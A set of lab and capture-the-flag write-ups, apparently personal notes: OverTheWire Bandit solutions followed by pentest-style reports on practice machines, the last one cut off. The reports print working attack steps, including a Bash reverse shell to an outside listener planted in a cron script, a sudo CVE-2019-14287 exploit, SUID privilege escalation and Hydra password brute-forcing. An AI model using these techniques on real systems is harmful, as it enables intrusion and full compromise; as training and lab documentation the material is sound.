During the push, the server printed the password for bandit32.

docs.title: Challenge
docs.text: After all this git stuff, it’s time for another escape. Good luck!

docs.title: Problem
docs.text:
Escape a restricted shell (“UPPERCASE SHELL”) and retrieve the final password for bandit33. Upon login, we are placed in a custom shell that:

  • Converts all input to uppercase
  • Executes commands via /bin/sh -c
  • Runs on a case-sensitive system

Because Linux commands are lowercase, this breaks normal usage.

docs.title: Examples
docs.text: Input Executed Result ls LS Permission denied sh SH Permission denied

docs.title: Solution
docs.text:
Although commands are uppercased, shell variable expansion happens after the uppercase conversion.

That means variables like $0 still work.

docs.title: $0 Variable
docs.text:
• $0 expands to the name of the current shell
  • In this environment, $0 = sh
  • Even though input is uppercased, the expansion remains valid

docs.title: Escape Command
docs.text:
$0

This spawns a real interactive shell.

whoami

bandit32

cat /etc/bandit_pass/bandit33

This reveals the final Bandit password.

docs.title: Level 33
docs.text:
bandit33@bandit:~$ ls
README.txt
bandit33@bandit:~$ cat README.txt
Congratulations on solving the last level of this game!

docs.title: Bandit (OverTheWire) — Levels 0–10
docs.text: This document contains concise notes and solutions for Bandit Levels 0–10 from OverTheWire, focusing on the Linux commands and concepts required to solve each challenge.

docs.title: Objective
docs.text: Connect to the Bandit server using SSH.

docs.title: Solution
docs.text:
ssh bandit0@bandit.labs.overthewire.org -p 2220

Password:

bandit0

docs.title: Objective
docs.text: Retrieve the password stored in a file named -.

docs.title: Solution
docs.text: cat ./-

docs.title: Explanation
docs.text: The filename is literally -. Prefixing it with ./ prevents it from being interpreted as standard input.

docs.title: Objective
docs.text:
Read a file named:

--spaces in this filename--

docs.title: Solution
docs.text:
cat -- --spaces\ in\ this\ filename--

or

cat "./--spaces in this filename--"

docs.title: Explanation
docs.text:
Files beginning with -- are normally interpreted as command options.

Using -- tells the command to stop parsing options and treat everything afterwards as a filename.

docs.title: Objective
docs.text: Locate a hidden file inside the inhere directory.

docs.title: Solution
docs.text:
cd inhere

ls -la

cat .hidden

docs.title: Explanation
docs.text: ls -la displays hidden files beginning with a period.

docs.title: Objective
docs.text: Find the only human-readable file.

docs.title: Solution
docs.text:
cd inhere

file ./*

cat ./-file07

docs.title: Explanation
docs.text: The file command identifies file types. Only one file is plain ASCII text.

docs.title: Objective
docs.text:
Locate a file that is:

  • human-readable
  • exactly 1033 bytes
  • not executable

docs.title: Solution
docs.text:
find inhere -type f -size 1033c ! -executable -print0 \
| xargs -0 file \
| awk -F: '/text/{print $1; exit}' \
| xargs -I{} cat "{}"

docs.title: Explanation
docs.text: This command searches for files matching the required properties before displaying the contents of the first text file found.

docs.title: Objective
docs.text:
Locate a file that is:

  • owned by bandit7
  • group bandit6
  • 33 bytes

docs.title: Solution
docs.text:
find / -type f -user bandit7 -group bandit6 -size 33c \
-print0 -quit 2>/dev/null \
| xargs -0 cat

docs.title: Explanation
docs.text:
• -print0 safely handles unusual filenames.
  • -quit stops after the first match.
  • 2>/dev/null hides permission errors.
  • xargs -0 safely passes the filename to cat.

docs.title: Objective
docs.text: Locate the password stored beside the word millionth.

docs.title: Solution
docs.text:
grep "millionth" data.txt

or

grep "millionth" data.txt | awk '{print $2}'

docs.title: Explanation
docs.text: grep finds the matching line, while awk extracts only the password.

docs.title: Objective
docs.text: Find the only line appearing exactly once.

docs.title: Solution
docs.text: sort data.txt | uniq -u

docs.title: Explanation
docs.text: uniq only compares adjacent lines, so the input must first be sorted.

docs.title: Objective
docs.text: Locate the password hidden inside a binary file.

docs.title: Solution
docs.text: strings data.txt | grep "==="

docs.title: Explanation
docs.text: strings extracts printable text before filtering with grep.

docs.title: Objective
docs.text: Decode the Base64 encoded password.

docs.title: Solution
docs.text:
base64 -d data.txt

Alternative:

base64 --decode data.txt

If necessary:

base64 -d data.txt | strings

docs.title: Explanation
docs.text: The password is stored using Base64 encoding and simply needs to be decoded.

docs.title: Skills Practiced
docs.text:
• SSH
  • Linux filesystem navigation
  • Hidden files
  • File permissions
  • find
  • grep
  • awk
  • sort
  • uniq
  • strings
  • Base64 decoding
  • Command pipelines
  • Shell escaping

docs.title: Tools Used
docs.text:
• SSH
  • GNU Coreutils
  • find
  • grep
  • awk
  • xargs
  • strings
  • base64

docs.title: Objective
docs.text: Decode the ROT13-encoded password stored in data.txt.

docs.title: Solution
docs.text:
tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt

Alternative (Python):

python3 -c "import codecs; print(codecs.decode(open('data.txt').read(), 'rot_13'))"

docs.title: Explanation
docs.text:
The password is encoded using ROT13, a Caesar cipher that rotates each letter by 13 positions.

The tr command performs character translation:

  • A-Z → N-ZA-M
  • a-z → n-za-m

The < data.txt redirection feeds the contents of the file directly into tr, printing the decoded password.

docs.title: Objective
docs.text: Recover the password from a repeatedly compressed hexdump stored in data.txt.

docs.title: Solution
docs.text:
Create a temporary working directory:

tmpdir=$(mktemp -d)
cd "$tmpdir"

Copy the challenge file:

cp /home/bandit12/data.txt .

Rename it:

mv data.txt data.bin

Reverse the hexdump:

xxd -r data.bin > data.orig

Identify the file type:

file data.orig

Depending on the reported format, decompress accordingly.

For gzip:

mv data.orig data.gz
gunzip data.gz

For bzip2:

mv data.orig data.bz2
bunzip2 data.bz2

For tar archives:

tar xf data.tar

Repeat the following until the file becomes plain text:

file <filename>

Finally, read the password:

cat <filename>

docs.title: Explanation
docs.text:
The challenge file is a hexadecimal dump of a file that has been compressed multiple times.

  • xxd -r converts the hexdump back into its original binary form.
  • file identifies the current file format.
  • Each compression layer must be decompressed before inspecting the next one.
  • Continue until file reports plain ASCII text.

If gunzip refuses to process a file because of its extension, rename it first:

mv data.out data.gz
gunzip data.gz

A file beginning with the magic number:

1f8b

indicates a gzip archive.

docs.title: Objective
docs.text: Use the provided SSH private key to log in as bandit14 and retrieve the next password.

docs.title: Solution
docs.text:
Save the private key locally:

nano /tmp/bandit14_key
chmod 600 /tmp/bandit14_key

Connect using the key:

ssh -i /tmp/bandit14_key -p 2220 bandit14@bandit.labs.overthewire.org

Retrieve the password:

cat /etc/bandit_pass/bandit14

docs.title: Explanation
docs.text:
Instead of receiving the next password directly, this level provides an SSH private key.

After saving the key with appropriate permissions (chmod 600), use it to authenticate as bandit14 and read the password from the standard password file.

docs.title: Objective
docs.text: Submit the current password to the service listening on port 30000.

docs.title: Solution
docs.text: cat /etc/bandit_pass/bandit14 | nc localhost 30000

docs.title: Explanation
docs.text:
The command:

  • reads the current password,
  • pipes it into nc (Netcat),
  • connects to localhost on TCP port 30000,
  • sends the password to the service.

If the password is correct, the service returns the password for the next level.

docs.title: Objective
docs.text: Submit the current password to the SSL/TLS service running on port 30001.

docs.title: Solution
docs.text:
Option 1:

printf "%s\n" "$(cat /etc/bandit_pass/bandit15)" | openssl s_client -connect localhost:30001 -quiet 2>/dev/null

Option 2:

openssl s_client -connect localhost:30001 -quiet < /etc/bandit_pass/bandit15 2>/dev/null

docs.title: Explanation
docs.text:
Unlike the previous level, the service communicates over SSL/TLS, requiring an encrypted connection.

openssl s_client performs the TLS handshake before sending the password.

  • printf ensures the password ends with a newline.
  • -quiet suppresses most TLS session information.
  • 2>/dev/null hides diagnostic output, leaving only the server response.

Input redirection (<) sends the contents of the password file directly into the encrypted connection.

docs.title: Objective
docs.text: Retrieve the next password by submitting the current password to the correct SSL/TLS service running on one of the localhost ports between 31000 and 32000.

docs.title: Solution
docs.text:
Scan the port range:

nmap -p 31000-32000 localhost

The scan reveals the following open ports:

31046
31518
31691
31790
31960

Determine which ports support SSL/TLS:

timeout 2 bash -c 'echo | openssl s_client -connect 127.0.0.1:PORT 2>&1' | sed -n '1,6p'

Ports presenting a certificate are TLS-enabled.

Submit the current password to each TLS service:

PASS="$(cat /etc/bandit_pass/bandit16)"; for p in 31518 31790; do echo "---- $p ----"; printf "%s\n" "$PASS" | timeout 3 bash -c "openssl s_client -connect 127.0.0.1:$p -quiet 2>/dev/null" | sed -n '1,8p'; done

The service that returns a different string instead of echoing the submitted password provides the password for the next level.

docs.title: Explanation
docs.text:
The challenge requires identifying which service both:

  • accepts SSL/TLS connections,
  • and validates the supplied password.

The process consists of:

  1. Scanning the specified port range.
  2. Identifying TLS-enabled services using openssl s_client.
  3. Sending the current password to each TLS service.
  4. Identifying the service that returns a new password rather than echoing the input.

The sed -n '1,8p' command limits the output to the first eight lines, making the server's response easier to read.

docs.title: Objective
docs.text: Find the only line that differs between passwords.old and passwords.new.

docs.title: Solution
docs.text:
diff passwords.old passwords.new

Alternative:

diff passwords.old passwords.new | grep ">"

Only print the changed line:

diff --new-line-format="%L" --old-line-format="" --unchanged-line-format="" passwords.old passwords.new

docs.title: Explanation
docs.text:
The challenge states that exactly one line has changed.

The diff utility compares both files line-by-line.

  • Lines beginning with < belong to passwords.old.
  • Lines beginning with > belong to passwords.new.

The changed line from passwords.new is the password for the next level.

docs.title: Objective
docs.text: Retrieve the password stored in readme despite .bashrc logging you out immediately after login.

docs.title: Solution
docs.text:
Run the command directly through SSH:

ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme

Alternative using SCP:

scp -P 2220 bandit18@bandit.labs.overthewire.org:readme .
cat readme

Alternative shell without loading configuration files:

ssh bandit18@bandit.labs.overthewire.org -p 2220 'bash --noprofile --norc'

docs.title: Explanation
docs.text:
The modified .bashrc immediately terminates interactive login sessions.

Providing a command directly to ssh avoids starting an interactive shell, preventing .bashrc from executing. The command runs immediately and prints the contents of readme, which contains the next password.

docs.title: Objective
docs.text: Use the provided setuid binary to read the password for bandit20.

docs.title: Solution
docs.text:
Inspect the home directory:

ls -l

Execute the binary without arguments:

./bandit20-do

Read the password:

./bandit20-do cat /etc/bandit_pass/bandit20

docs.title: Explanation
docs.text:
The bandit20-do binary has the setuid bit enabled.

Although logged in as bandit19, executing the binary causes it to run with the privileges of bandit20.

This allows the supplied command (cat /etc/bandit_pass/bandit20) to access a file that would normally be unreadable.

docs.title: Objective
docs.text: Use the provided setuid binary to retrieve the password for bandit21.

docs.title: Solution
docs.text:
Start a Netcat listener:

nc -lvp 12345

In a second terminal, connect to the same Bandit account and execute:

./suconnect 12345

Return to the Netcat listener, paste the current password, and press Enter.

The service responds with:

Correct!
<bandit21 password>

docs.title: Explanation
docs.text:
The suconnect binary runs with the privileges of bandit21.

Instead of listening for connections, it connects to a TCP port that you specify.

The solution is therefore to:

  1. Create a listener using Netcat.
  2. Execute the setuid binary, pointing it at the listener.
  3. Send the current password through the established connection.
  4. Receive the next password from the service.

docs.title: Objective
docs.text: Inspect the cron job configuration to determine where the password for the next level is being written.

docs.title: Solution
docs.text:
List the cron jobs:

ls /etc/cron.d

Inspect the relevant cron job:

cat /etc/cron.d/cronjob_bandit22

Read the script executed by cron:

cat /usr/bin/cronjob_bandit22.sh

Locate and read the output file:

ls -l /tmp
cat /tmp/bandit22_pass

docs.title: Explanation
docs.text:
The cron scheduler executes cronjob_bandit22.sh every minute as bandit22.

The script reads:

/etc/bandit_pass/bandit22

and writes its contents into a file inside /tmp, making it accessible to other users. Reading that file reveals the password.

docs.title: Objective
docs.text: Determine the filename generated by the cron job and retrieve the password written to it.

docs.title: Solution
docs.text:
Inspect the cron configuration:

cat /etc/cron.d/cronjob_bandit23

Read the script:

cat /usr/bin/cronjob_bandit23.sh

Generate the filename exactly as the script does:

hash=$(echo "I am user bandit23" | md5sum | cut -d' ' -f1)

Remove any conflicting file:

rm -f /tmp/"$hash"

Wait for cron to execute:

sleep 65

Read the generated file:

cat /tmp/"$hash"

docs.title: Explanation
docs.text:
The cron job runs as bandit23 every minute.

The script calculates an MD5 hash of the string:

I am user bandit23

and uses it as the filename inside /tmp.

After cron executes, the generated file contains the password for the next level.

docs.title: Objective
docs.text: Exploit the cron job that executes scripts placed inside /var/spool/bandit24/foo.

docs.title: Solution
docs.text:
Create a temporary working directory:

cd /tmp
mkdir exploit23
cd exploit23

Create the payload:

nano myscript.sh

Contents:

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/b24pass

Make it executable:

chmod +x myscript.sh

Copy it into the cron directory:

cp myscript.sh /var/spool/bandit24/foo/

Wait for cron:

sleep 65

Read the password:

cat /tmp/b24pass

docs.title: Explanation
docs.text:
Every minute, the cron service running as bandit24 executes every script found inside:

/var/spool/bandit24/foo/

By placing a custom script there, it executes with bandit24 privileges and copies the protected password into /tmp, where it can be read before the script is automatically deleted.

docs.title: Objective
docs.text: Brute-force the 4-digit PIN required by the service listening on port 30002.

docs.title: Solution
docs.text:
pass=$(cat /etc/bandit_pass/bandit24); \
for pin in $(seq -w 0000 9999); do \
echo "$pass $pin"; \
done | nc localhost 30002

docs.title: Explanation
docs.text:
The daemon expects a single line containing:

<password> <4-digit-pin>

Using seq -w generates every possible PIN from 0000 to 9999.

All attempts are sent through one persistent Netcat connection, allowing the daemon to validate each PIN until the correct combination is found. Once successful, it returns the password for the next level.

docs.title: Objective
docs.text: Escape the restricted login shell used by bandit26.

docs.title: Solution
docs.text:
Determine the login shell:

grep bandit26 /etc/passwd

Log in using the provided private key:

ssh -p 2220 -i bandit26.sshkey bandit26@bandit.labs.overthewire.org

Inside vi, spawn a shell:

:set shell=/bin/bash
:shell

Alternative:

:! /bin/bash

Read the password:

cat /etc/bandit_pass/bandit26

docs.title: Explanation
docs.text:
Instead of using /bin/bash, the account launches the showtext program, which opens vi.

Although this creates a restricted environment, vi supports shell escapes, allowing a normal Bash shell to be spawned and the password file to be accessed.

docs.title: Objective
docs.text: Use the provided SUID binary to retrieve the password for bandit27.

docs.title: Solution
docs.text:
Inspect the directory:

ls -l

Execute the SUID helper:

./bandit27-do cat /etc/bandit_pass/bandit27

docs.title: Explanation
docs.text:
The bandit27-do binary has the setuid bit enabled, causing it to execute with the privileges of bandit27.

By supplying cat /etc/bandit_pass/bandit27 as its argument, the binary reads the protected password file and prints the password for the next level.

docs.title: Objective
docs.text: Clone a remote Git repository over SSH and retrieve the password for bandit28.

docs.title: Solution
docs.text:
Clone the repository:

git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo

Enter the repository:

cd repo

List its contents:

ls -la

Read the password:

cat README

docs.title: Explanation
docs.text:
The repository is accessible over SSH using the current Bandit credentials.

Once cloned, the password is stored directly inside the README file.

docs.title: Objective
docs.text: Recover the password from the Git commit history.

docs.title: Solution
docs.text:
Clone the repository:

git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
cd repo

Inspect the current README:

cat README.md

View the commit history:

git log

Inspect previous commits:

git show <commit_hash>

Example:

git show d0cf2ab7

docs.title: Explanation
docs.text:
Although the password has been removed from the latest version of the repository, Git preserves every commit.

Inspecting earlier commits reveals the password before it was removed, demonstrating how secrets can remain accessible even after being deleted from the latest revision.

docs.title: Objective
docs.text: Find the password stored in a non-default Git branch.

docs.title: Solution
docs.text:
Clone the repository:

git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
cd repo

List all branches:

git branch -a

Switch to the development branch:

git checkout dev

Inspect the repository:

ls
cat README.md

docs.title: Explanation
docs.text:
The default branch does not contain the password.

Enumerating remote branches reveals a development branch where sensitive information was accidentally committed. Reading the README.md on that branch reveals the next password.

docs.title: Objective
docs.text: Retrieve the password stored as a Git tag.

docs.title: Solution
docs.text:
Clone the repository:

git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo
cd repo

List all tags:

git tag

Inspect the tag:

git show secret

docs.title: Explanation
docs.text:
Unlike previous levels, the password is not stored in the working tree, commit history, or branches.

Instead, it is stored inside a Git tag named secret, demonstrating that Git objects other than commits may also contain sensitive information.

docs.title: Objective
docs.text: Push a required file to the remote Git repository.

docs.title: Solution
docs.text:
Clone the repository:

git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
cd repo

Read the instructions:

cat README.md

Create the required file:

echo "May I come in?" > key.txt

Inspect .gitignore:

cat .gitignore

Force-add the file:

git add -f key.txt

Commit the changes:

git commit -m "add key"

Push to the remote repository:

git push origin master

docs.title: Explanation
docs.text:
The repository ignores every file through .gitignore.

Using git add -f overrides this restriction, allowing key.txt to be committed and pushed.

A server-side Git hook validates the submission and prints the password for the next level after a successful push.

docs.title: Objective
docs.text: Escape the restricted uppercase shell and retrieve the final password.

docs.title: Solution
docs.text:
Spawn a normal shell:

$0

Verify the current user:

whoami

Read the password:

cat /etc/bandit_pass/bandit33

docs.title: Explanation
docs.text:
The custom shell converts all typed commands to uppercase, preventing normal command execution.

However, shell variable expansion occurs after this transformation. The variable $0 expands to the current shell (sh), allowing a normal interactive shell to be spawned and bypassing the restriction.

docs.title: Objective
docs.text: Complete the Bandit wargame.

docs.title: Solution
docs.text:
View the final message:

ls
cat README.txt

docs.title: Explanation
docs.text:
There are no additional levels after Bandit 33.

The README.txt file congratulates you on completing the Bandit wargame and encourages exploring the remaining OverTheWire challenges.

docs.title: TL;DR
docs.text:
The target system was successfully compromised through a multi-stage attack chain involving information disclosure, weak credentials, steganography, and a vulnerable sudo configuration.

Initial enumeration revealed a web application that relied on User-Agent values for access control. By manipulating the User-Agent header, a valid username was disclosed. A password attack against the FTP service resulted in successful authentication, allowing retrieval of several files. Analysis of the downloaded artifacts uncovered hidden data through steganographic techniques, ultimately revealing SSH credentials for a second user.

After obtaining SSH access, privilege escalation was achieved by exploiting CVE-2019-14287 in a vulnerable sudo version, resulting in full root access to the system.

docs.title: Target Information
docs.text:
• Target IP: 10.113.154.110
  • Operating System: Ubuntu Linux
  • Open Ports:
    • 21/tcp (FTP - vsftpd 3.0.3)
    • 22/tcp (SSH - OpenSSH 7.6p1)
    • 80/tcp (HTTP - Apache 2.4.29)
  • Assessment Type: Authorized lab environment

docs.title: Executive Summary
docs.text:
The assessment identified several security weaknesses that, when chained together, enabled complete compromise of the target host.

The attack began with reconnaissance and service enumeration. The web application disclosed sensitive information based on manipulated User-Agent headers, allowing identification of a valid username. Weak FTP credentials were subsequently discovered through password bruteforcing and used to obtain access to files containing steganographically hidden information.

Multiple layers of hidden data, including an embedded ZIP archive, Base64-encoded information, and encrypted steganographic content, ultimately revealed valid SSH credentials. Following successful SSH authentication, a vulnerable sudo configuration combined with an outdated sudo version enabled privilege escalation to root through exploitation of CVE-2019-14287.

Key Findings:

Finding Severity Impact User-Agent Information Disclosure Medium Disclosure of valid usernames Weak FTP Credentials High Unauthorized access to sensitive files Sensitive Information Hidden in Files High Disclosure of additional credentials SSH Credential Exposure Critical Initial shell access obtained CVE-2019-14287 (Sudo Privilege Escalation) Critical Full root compromise

docs.title: Scope and Methodology
docs.text:
Scope

  • Target: 10.113.154.110
  • Application: Agent Sudo Lab Environment
  • Ports/Protocols in Scope:
    • HTTP (80/TCP)
    • FTP (21/TCP)
    • SSH (22/TCP)

Methodology

The assessment followed a structured penetration testing methodology:

  1. Reconnaissance & Enumeration: host discovery, port scanning, service enumeration, web application analysis
  2. Vulnerability Analysis: review of application behavior, authentication testing, file analysis, steganography analysis
  3. Exploitation: credential attacks, authentication bypass techniques, credential harvesting
  4. Post-Exploitation & Privilege Escalation: local enumeration, misconfiguration analysis, public exploit research, privilege escalation
  5. Documentation: evidence collection, attack path reconstruction, risk assessment

docs.title: Findings and Exploitation
docs.text:
Vulnerability Summary

The web application relied on User-Agent values to determine access permissions and exposed internal information to unauthenticated users. This disclosure enabled identification of a valid username, which was later leveraged during password attacks against exposed services.

Weak credentials allowed access to an FTP account containing files with hidden information. Through steganographic analysis and password recovery techniques, additional credentials were obtained and used to gain SSH access.

Technical Walkthrough

  1. Host Discovery

    The target host was verified as reachable using ICMP:

    ping -c 4 10.113.154.110

    Results confirmed host availability and network connectivity.

  2. Service Enumeration

    An Nmap scan identified three accessible services:

    nmap -sS -sV -sC -T4 10.113.154.110

    Discovered services:

    • FTP (vsftpd 3.0.3)
    • SSH (OpenSSH 7.6p1)
    • HTTP (Apache 2.4.29)

  3. Web Application Analysis

    Directory brute-forcing provided no useful results.

    Inspection of HTTP responses revealed behavior dependent on the User-Agent header.

    Using a spoofed User-Agent value:

    curl -A "C" -L http://10.113.154.110

    The application disclosed the following information:

    • Valid username: chris
    • Reference to weak password practices

  4. FTP Credential Attack

    A password attack was performed against FTP using Hydra:

    hydra -l chris -P rockyou.txt 10.113.154.110 ftp

    Successful credentials:

    Username: chris
Password: c*****al

  5. FTP Access and File Discovery

    After authenticating to FTP, the following files were identified:

    To_agentJ.txt
cute-alien.jpg
cutie.png

    All files were downloaded for analysis.

  6. Steganographic Analysis

    The note To_agentJ.txt indicated hidden content within the images.

    Binwalk analysis of cutie.png revealed an embedded encrypted ZIP archive.

    binwalk - M e cutie.png

    Because automated extraction failed, the ZIP archive was manually carved from the image using dd.

  7. ZIP Password Recovery

    The ZIP archive was protected with a password.

    The hash was extracted using:

    John the Ripper successfully recovered the password:

  8. Hidden Message Recovery

    The extracted file contained:

    Decoding the Base64 string revealed:

    Area51

  9. JPEG Steganography Extraction

    The recovered value was used as the passphrase for steghide:

    steghide extract -sf cute-alien.jpg

    A hidden message revealed SSH credentials:

    Username: james
Password: h*******s!

  10. Initial SSH Access

    Using the recovered credentials:

    ssh james@10.113.154.110

    A shell was obtained successfully.

docs.title: Post-Exploitation & Privilege Escalation
docs.text:
Vulnerability Summary

Local enumeration identified a sudo configuration that prohibited execution as root but allowed execution as all other users:

(ALL, !root) /bin/bash

The installed sudo version was:

1.8.21p2

This version is vulnerable to CVE-2019-14287.

Technical Walkthrough

  1. Sudo Enumeration

    sudo -l

    Output:

    (ALL, !root) /bin/bash

  2. Version Verification

    sudo --version

    Output:

    Sudo version 1.8.21p2

  3. Vulnerability Research

    Research identified the host as vulnerable to CVE-2019-14287, which allows bypassing RunAs restrictions by specifying the user ID:

    4294967295

  4. Exploitation

    The vulnerability was exploited with:

    sudo -u \#$((0xffffffff)) /bin/bash

    Result:

    root@agent-sudo:~#

    Full administrative access was obtained.

docs.title: Conclusion
docs.text:
The target host was fully compromised through a chain of weaknesses that included information disclosure, weak credentials, insecure storage of sensitive information, and a vulnerable sudo configuration.

An attacker with no prior access could enumerate services, obtain valid credentials, gain shell access, and escalate privileges to root. The attack required only publicly available tools and known exploitation techniques.

The most critical issue identified was the presence of CVE-2019-14287, which enabled immediate privilege escalation from a low-privileged account to full root access.

docs.title: Recommendations
docs.text:
1. Upgrade sudo to a version not affected by CVE-2019-14287.
  2. Remove unsafe sudo configurations such as (ALL, !root).
  3. Enforce strong password policies for all user accounts.
  4. Disable password-based authentication where possible and implement SSH key authentication.
  5. Avoid storing credentials in files, images, or hidden steganographic containers.
  6. Implement account lockout and rate-limiting protections on authentication services.
  7. Review FTP usage and disable the service if it is not required.
  8. Avoid using User-Agent values for authorization or access control decisions.
  9. Conduct periodic vulnerability assessments and patch management reviews.
  10. Monitor authentication logs for brute-force and credential-stuffing activity.

docs.title: TL;DR
docs.text: The target system was compromised through a misconfigured anonymous FTP service that exposed a world-writable directory containing a script executed by an automated task. By replacing the script with a reverse shell payload, remote code execution was achieved and a shell was obtained as the user namelessone. Further local enumeration revealed a misconfigured SUID binary (/usr/bin/env), which was abused to escalate privileges directly to root.

The assessment identified several critical security weaknesses that allowed complete compromise of the target host.

Anonymous FTP access exposed a writable directory containing scripts used by the system. Analysis of log files indicated that one of these scripts was executed automatically on a recurring basis. By modifying the script and injecting a reverse shell payload, arbitrary command execution was achieved without authentication.

Following initial access, local privilege escalation enumeration identified a SUID-enabled instance of /usr/bin/env. This binary is known to permit execution of arbitrary programs with elevated privileges when improperly configured. Abuse of this misconfiguration resulted in immediate root access.

docs.title: Findings and Exploitation
docs.text:
Vulnerability Summary

Anonymous FTP access exposed a world-writable scripts directory. Analysis of log files revealed that a script inside this directory was executed automatically. By modifying the script and injecting a reverse shell payload, arbitrary command execution was achieved.

Technical Walkthrough

  1. Initial Reconnaissance

    nmap -sS -sV -sC -T4 -p- -oA initial_nmap_scan $ip

    A full TCP scan identified four exposed services:

    - FTP
- SSH
- SMB (139)
- SMB (445)

    Notable findings:

    - Anonymous FTP access enabled
- SMB shares accessible anonymously

  2. FTP Enumeration

    Anonymous authentication was successful.

    A writable directory named scripts was discovered:

    Contents:

    clean.sh
removed_files.log
to_do.txt

    All files were downloaded for offline review.

  3. Analysis of FTP Files

    to_do.txt

    Contained administrative notes, including a reminder that anonymous access should be removed.

    removed_files.log

    Contained repeated entries:

    The repeated log entries suggested scheduled execution of clean.sh.

    clean.sh

    A cleanup script intended to remove temporary files and append entries to the log file.

  4. SMB Enumeration

    Anonymous SMB enumeration revealed the following share:

    pics

    Files discovered:

    corgo2.jpg
puppos.jpeg

    The files were downloaded and analyzed but did not contribute to the compromise path.

  5. Remote Code Execution

    The recurring log entries strongly suggested that clean.sh was executed automatically.

    Because the script resided in a writable FTP directory, it was replaced with a Bash reverse shell payload:

    #!/bin/bash
bash -i >& /dev/tcp/192.168.135.124/4444 0>&1

    A Netcat listener was started on the attacking host:

    nc -lvnp 4444

    After the scheduled task executed, a reverse shell connection was received:

docs.title: Post-Exploitation & Privilege Escalation
docs.text:
Vulnerability Summary

A SUID-enabled instance of /usr/bin/env was present on the system.

This binary can execute arbitrary commands while preserving elevated privileges, making it a known privilege escalation vector when misconfigured.

Technical Walkthrough

  1. SUID Enumeration

    The following command was executed:

    find / -type f -perm -4000 2>/dev/null

    A notable result was identified:

    /usr/bin/env

    Permissions:

    -rwsr-xr-x 1 root root /usr/bin/env

  2. Privilege Escalation

    The SUID binary was abused as follows:

    /usr/bin/env /bin/sh -p

    Root access was immediately obtained:

    whoami
root

    Verification:

    cd /root
ls
cat root.txt

    This confirmed complete system compromise.

docs.text: Risk Factor Analysis Attack Complexity Low Required Privileges None User Interaction None Exploit Availability Public techniques available Confidentiality Impact Complete compromise Integrity Impact Complete compromise Availability Impact Complete compromise

docs.title: Conclusion
docs.text:
The target was fully compromised through a chain of security misconfigurations.

Anonymous FTP access exposed a writable scripts directory that contained a script executed automatically by the system. Modification of this script resulted in remote code execution and shell access as namelessone.

Subsequent local enumeration revealed a misconfigured SUID binary (/usr/bin/env), which enabled direct privilege escalation to root.

The combination of anonymous access, writable executable content, and unsafe privilege configuration resulted in complete system compromise.

docs.title: Recommendations
docs.text:
1. Disable anonymous FTP access.
  2. Remove write permissions from publicly accessible directories.
  3. Prevent scheduled tasks from executing files stored in user-controlled locations.
  4. Implement file integrity monitoring for scripts executed automatically.
  5. Review all SUID binaries and remove unnecessary permissions.
  6. Remove SUID permissions from /usr/bin/env.
  7. Regularly audit privilege escalation vectors using automated hardening tools.
  8. Restrict SMB access to authenticated users only.
  9. Implement centralized monitoring and alerting for file modifications in sensitive directories.

docs.title: TL;DR
docs.text: The target system was fully compromised through a chain of misconfigurations and weak credentials. Initial access was achieved via SSH after brute-forcing credentials discovered through FTP enumeration. Privilege escalation was later performed by exploiting a misconfigured sudo permission allowing execution of /bin/tar as root, which was abused using GTFOBins-style argument injection to obtain a root shell.

docs.text:
• Target IP: 10.112.183.159
  • Operating System: Ubuntu Linux 20.04 LTS
  • Open Ports:

docs.title: Executive Summary
docs.text:
The assessment revealed multiple security weaknesses across exposed services, including anonymous FTP access, weak credential reuse, and insecure sudo configuration.

The attack began with FTP enumeration, where sensitive files were retrieved containing a password list and a possible username. This information enabled a successful brute-force attack against SSH, granting initial shell access.

Post-exploitation enumeration identified a misconfigured sudo rule allowing the user to execute /bin/tar as root. This configuration was abused using tar’s checkpoint functionality to execute arbitrary commands as root, resulting in full system compromise.

Key Findings:

Finding Severity Impact Anonymous FTP Access with Sensitive Files High Exposure of credentials and internal notes Weak SSH Credentials Critical Initial system compromise Insecure sudo configuration (/bin/tar as root) Critical Full privilege escalation to root Lack of service hardening Medium Increased attack surface

Scope:

  • Target: 10.112.183.159
  • Application: Bounty Hacker
